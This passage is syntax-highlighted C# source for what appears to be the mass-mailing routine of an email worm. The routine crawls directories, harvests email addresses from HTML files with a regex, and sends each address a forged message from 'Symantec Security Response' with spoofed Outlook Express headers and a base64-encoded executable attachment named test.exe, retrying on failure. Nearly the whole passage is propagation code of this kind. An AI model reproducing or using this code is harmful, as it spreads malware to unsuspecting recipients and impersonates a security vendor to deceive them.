</span><span class="sc0">            </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">b64encoded</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">Convert</span><span class="sc10">.</span><span class="sc11">ToBase64String</span><span class="sc10">(</span><span class="sc11">bArray</span><span class="sc10">);</span><span class="sc0">

            </span><span class="sc2">// Insert \r\n after every 76 chars
</span><span class="sc0">            </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">smtpCursor</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc11">b64encoded</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">Size</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">Math</span><span class="sc10">.</span><span class="sc11">Min</span><span class="sc10">(</span><span class="sc4">76</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">b64encoded</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc11">smtpCursor</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">b64String</span><span class="sc10">.</span><span class="sc11">Append</span><span class="sc10">(</span><span class="sc11">b64encoded</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">smtpCursor</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">Size</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">b64String</span><span class="sc10">.</span><span class="sc11">Append</span><span class="sc10">(</span><span class="sc6">"\r\n"</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">smtpCursor</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">Size</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">

            </span><span class="sc2">// Connect to server
</span><span class="sc0">            </span><span class="sc11">smtp</span><span class="sc10">.</span><span class="sc11">Connect</span><span class="sc10">((</span><span class="sc16">string</span><span class="sc10">)</span><span class="sc11">smtpServer</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">25</span><span class="sc10">);</span><span class="sc0">
            
            </span><span class="sc2">// Creates and Initializes
</span><span class="sc0">            </span><span class="sc11">NetworkStream</span><span class="sc0"> </span><span class="sc11">smtpStream</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">smtp</span><span class="sc10">.</span><span class="sc11">GetStream</span><span class="sc10">();</span><span class="sc0">
            </span><span class="sc11">StreamReader</span><span class="sc0"> </span><span class="sc11">smtpReader</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">StreamReader</span><span class="sc10">(</span><span class="sc11">smtp</span><span class="sc10">.</span><span class="sc11">GetStream</span><span class="sc10">());</span><span class="sc0">
            </span><span class="sc11">StreamWriter</span><span class="sc0"> </span><span class="sc11">smtpWriter</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">StreamWriter</span><span class="sc10">(</span><span class="sc11">smtpStream</span><span class="sc10">);</span><span class="sc0">

            </span><span class="sc11">smtpWriter</span><span class="sc10">.</span><span class="sc11">AutoFlush</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">true</span><span class="sc10">;</span><span class="sc0">

            </span><span class="sc2">// Get the reply from server
</span><span class="sc0">            </span><span class="sc11">smReply</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">smtpReader</span><span class="sc10">.</span><span class="sc11">ToString</span><span class="sc10">();</span><span class="sc0">

            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">smReply</span><span class="sc10">.</span><span class="sc11">Substring</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">3</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc6">"220"</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">smtpWriter</span><span class="sc10">.</span><span class="sc11">WriteLine</span><span class="sc10">(</span><span class="sc6">"HELO localhost\r\n"</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">smReply</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">smtpReader</span><span class="sc10">.</span><span class="sc11">ToString</span><span class="sc10">();</span><span class="sc0">

                </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">smReply</span><span class="sc10">.</span><span class="sc11">Substring</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">3</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc6">"250"</span><span class="sc10">)</span><span class="sc0">
                </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc5">try</span><span class="sc0">
                    </span><span class="sc10">{</span><span class="sc0">
                        </span><span class="sc5">foreach</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">cDirs</span><span class="sc0"> </span><span class="sc5">in</span><span class="sc0"> </span><span class="sc11">List</span><span class="sc10">)</span><span class="sc0">
                        </span><span class="sc10">{</span><span class="sc0">
                            </span><span class="sc16">string</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">htmlFiles</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">Directory</span><span class="sc10">.</span><span class="sc11">GetFiles</span><span class="sc10">(</span><span class="sc11">cDirs</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"*html"</span><span class="sc10">);</span><span class="sc0">

                            </span><span class="sc5">foreach</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">htmlFile</span><span class="sc0"> </span><span class="sc5">in</span><span class="sc0"> </span><span class="sc11">htmlFiles</span><span class="sc10">)</span><span class="sc0">
                            </span><span class="sc10">{</span><span class="sc0">
                                </span><span class="sc11">Regex</span><span class="sc0"> </span><span class="sc11">hRegex</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">Regex</span><span class="sc10">(</span><span class="sc6">"[a-zA-Z0-9-_.-]+@[a-zA-Z0-9-_.-]+\\.[a-zA-Z0-9]+"</span><span class="sc10">);</span><span class="sc0">

                                </span><span class="sc11">FileStream</span><span class="sc0"> </span><span class="sc11">inFile</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">FileStream</span><span class="sc10">(</span><span class="sc11">htmlFile</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FileMode</span><span class="sc10">.</span><span class="sc11">Open</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FileAccess</span><span class="sc10">.</span><span class="sc11">Read</span><span class="sc10">);</span><span class="sc0">

                                </span><span class="sc2">// Read html file
</span><span class="sc0">                                </span><span class="sc16">byte</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">source</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc16">byte</span><span class="sc10">[</span><span class="sc11">inFile</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc10">];</span><span class="sc0">
                                </span><span class="sc11">inFile</span><span class="sc10">.</span><span class="sc11">Read</span><span class="sc10">(</span><span class="sc11">source</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">int</span><span class="sc10">)</span><span class="sc11">inFile</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc10">);</span><span class="sc0">
                                </span><span class="sc11">inFile</span><span class="sc10">.</span><span class="sc11">Close</span><span class="sc10">();</span><span class="sc0">

                                </span><span class="sc2">// string htmlsource = Encoding.ASCII.GetString(source);
</span><span class="sc0">
                                </span><span class="sc5">foreach</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">Match</span><span class="sc0"> </span><span class="sc11">strMatch</span><span class="sc0"> </span><span class="sc5">in</span><span class="sc0"> </span><span class="sc11">hRegex</span><span class="sc10">.</span><span class="sc11">Matches</span><span class="sc10">(</span><span class="sc11">Encoding</span><span class="sc10">.</span><span class="sc11">ASCII</span><span class="sc10">.</span><span class="sc11">GetString</span><span class="sc10">(</span><span class="sc11">source</span><span class="sc10">)))</span><span class="sc0">
                                </span><span class="sc10">{</span><span class="sc0">
                                    </span><span class="sc2">// Message From
</span><span class="sc0">                                    </span><span class="sc11">smtpWriter</span><span class="sc10">.</span><span class="sc11">WriteLine</span><span class="sc10">(</span><span class="sc6">"MAIL FROM: "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">pferrie</span><span class="sc10">);</span><span class="sc0">
                                    </span><span class="sc11">smReply</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">smtpReader</span><span class="sc10">.</span><span class="sc11">ToString</span><span class="sc10">();</span><span class="sc0">

                                    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">smReply</span><span class="sc10">.</span><span class="sc11">Substring</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">3</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc6">"250"</span><span class="sc10">)</span><span class="sc0">
                                    </span><span class="sc10">{</span><span class="sc0">
                                        </span><span class="sc2">// Message too
</span><span class="sc0">                                        </span><span class="sc11">smtpWriter</span><span class="sc10">.</span><span class="sc11">WriteLine</span><span class="sc10">(</span><span class="sc6">"RCPT TO: "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">strMatch</span><span class="sc10">);</span><span class="sc0">
                                        </span><span class="sc11">smReply</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">smtpReader</span><span class="sc10">.</span><span class="sc11">ToString</span><span class="sc10">();</span><span class="sc0">

                                        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">smReply</span><span class="sc10">.</span><span class="sc11">Substring</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">3</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc6">"250"</span><span class="sc10">)</span><span class="sc0">
                                        </span><span class="sc10">{</span><span class="sc0">
                                            </span><span class="sc2">// Message input is ready
</span><span class="sc0">                                            </span><span class="sc11">smtpWriter</span><span class="sc10">.</span><span class="sc11">WriteLine</span><span class="sc10">(</span><span class="sc6">"DATA"</span><span class="sc10">);</span><span class="sc0">
                                            </span><span class="sc11">smReply</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">smtpReader</span><span class="sc10">.</span><span class="sc11">ToString</span><span class="sc10">();</span><span class="sc0">

                                            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">smReply</span><span class="sc10">.</span><span class="sc11">Substring</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">3</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc6">"354"</span><span class="sc10">)</span><span class="sc0">
                                            </span><span class="sc10">{</span><span class="sc0">
                                                </span><span class="sc2">// Write the contents
</span><span class="sc0">                                                </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">mime</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"FROM: Symantec Security Response &lt;"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">pferrie</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"&gt;\r\n"</span><span class="sc0">
                                                            </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"TO: &lt;"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">strMatch</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"&gt; "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">strMatch</span><span class="sc0">
                                                            </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"SUBJECT: "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">nSubject</span><span class="sc10">[</span><span class="sc11">rand</span><span class="sc10">.</span><span class="sc11">Next</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">nSubject</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc10">)]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"\r\n"</span><span class="sc0">
                                                            </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"MIME-Version: 1.0\r\n"</span><span class="sc0">
                                                            </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"Content-Type: multipart/mixed;\r\n\t"</span><span class="sc0">
                                                            </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"boundary=\""</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">boundary</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"\""</span><span class="sc0">
                                                            </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"X-Priority: 3\r\n"</span><span class="sc0">
                                                            </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"X-MSMail-Priority: Normal\r\n"</span><span class="sc0">
                                                            </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"X-Mailer: Microsoft Outlook Express 6.00.2900.2180\r\n"</span><span class="sc0">
                                                            </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2900.2180\r\n\r\n"</span><span class="sc0">
                                                            </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"This is a multi-part message in MIME format.\r\n"</span><span class="sc0">
                                                            </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"--"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">boundary</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"\r\n"</span><span class="sc0">
                                                            </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"Content-Type: text/html;\r\n\t"</span><span class="sc0">
                                                            </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"charset\"iso-8859-1\"\r\n"</span><span class="sc0">
                                                            </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"Content-Transfer-Encoding: 7bit\r\n\r\n"</span><span class="sc0">
                                                            </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">htmlMsg</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"\r\n--"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">boundary</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"\r\n"</span><span class="sc0">
                                                            </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"Content-Type: application/octet-stream;\r\n\t"</span><span class="sc0">
                                                            </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"name=\"test.exe\"\r\n"</span><span class="sc0">
                                                            </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"Content-Transfer-Encoding: base64\r\n"</span><span class="sc0">
                                                            </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"Content-Disposition: attachment;\r\n\t"</span><span class="sc0">
                                                            </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"filename=\"test.exe\"\r\n\r\n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">b64String</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"\r\n\r\n"</span><span class="sc0">
                                                            </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"--"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">boundary</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"--\r\n.\r\n"</span><span class="sc10">;</span><span class="sc0">

                                                </span><span class="sc11">smtpWriter</span><span class="sc10">.</span><span class="sc11">WriteLine</span><span class="sc10">(</span><span class="sc11">mime</span><span class="sc10">);</span><span class="sc0">
                                                </span><span class="sc11">smReply</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">smtpReader</span><span class="sc10">.</span><span class="sc11">ToString</span><span class="sc10">();</span><span class="sc0">

                                                </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">smReply</span><span class="sc10">.</span><span class="sc11">Substring</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">3</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc6">"250"</span><span class="sc10">)</span><span class="sc0">
                                                </span><span class="sc10">{</span><span class="sc0">
                                                    </span><span class="sc2">// If email was sent ok then continue
</span><span class="sc0">                                                    </span><span class="sc5">continue</span><span class="sc10">;</span><span class="sc0">
                                                </span><span class="sc10">}</span><span class="sc0">
                                                </span><span class="sc5">else</span><span class="sc0">
                                                </span><span class="sc10">{</span><span class="sc0">
                                                    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">l</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">

                                                    </span><span class="sc2">// Retry, up to five times
</span><span class="sc0">                                                    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">l</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">5</span><span class="sc10">)</span><span class="sc0">
                                                    </span><span class="sc10">{</span><span class="sc0">
                                                        </span><span class="sc11">smtp</span><span class="sc10">.</span><span class="sc11">Close</span><span class="sc10">();</span><span class="sc0">
                                                        </span><span class="sc11">Letum</span><span class="sc10">.</span><span class="sc11">smtp</span><span class="sc10">();</span><span class="sc0">
                                                        </span><span class="sc11">l</span><span class="sc10">++;</span><span class="sc0">
                                                    </span><span class="sc10">}</span><span class="sc0">
                                                </span><span class="sc10">}</span><span class="sc0">
                                            </span><span class="sc10">}</span><span class="sc0">
                                        </span><span class="sc10">}</span><span class="sc0">
                                    </span><span class="sc10">}</span><span class="sc0">
                                </span><span class="sc10">}</span><span class="sc0">
                            </span><span class="sc10">}</span><span class="sc0">
                        </span><span class="sc10">}</span><span class="sc0">
                    </span><span class="sc10">}</span><span class="sc0">

                    </span><span class="sc5">catch</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">UnauthorizedAccessException</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc10">}</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">

            </span><span class="sc2">// Close connection with server
</span><span class="sc0">            </span><span class="sc11">smtp</span><span class="sc10">.</span><span class="sc11">Close</span><span class="sc10">();</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc16">static</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">CollectDirs</span><span class="sc10">(</span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">dir</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ArrayList</span><span class="sc0"> </span><span class="sc11">storage</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc5">try</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc16">string</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">dirs</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">Directory</span><span class="sc10">.</span><span class="sc11">GetDirectories</span><span class="sc10">(</span><span class="sc11">dir</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc5">foreach</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">d</span><span class="sc0"> </span><span class="sc5">in</span><span class="sc0"> </span><span class="sc11">dirs</span><span class="sc10">)</span><span class="sc0">
                </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc11">storage</span><span class="sc10">.</span><span class="sc11">Add</span><span class="sc10">(</span><span class="sc11">d</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc11">CollectDirs</span><span class="sc10">(</span><span class="sc11">d</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">storage</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc5">catch</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">UnauthorizedAccessException</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
</span></div></body>
</html>
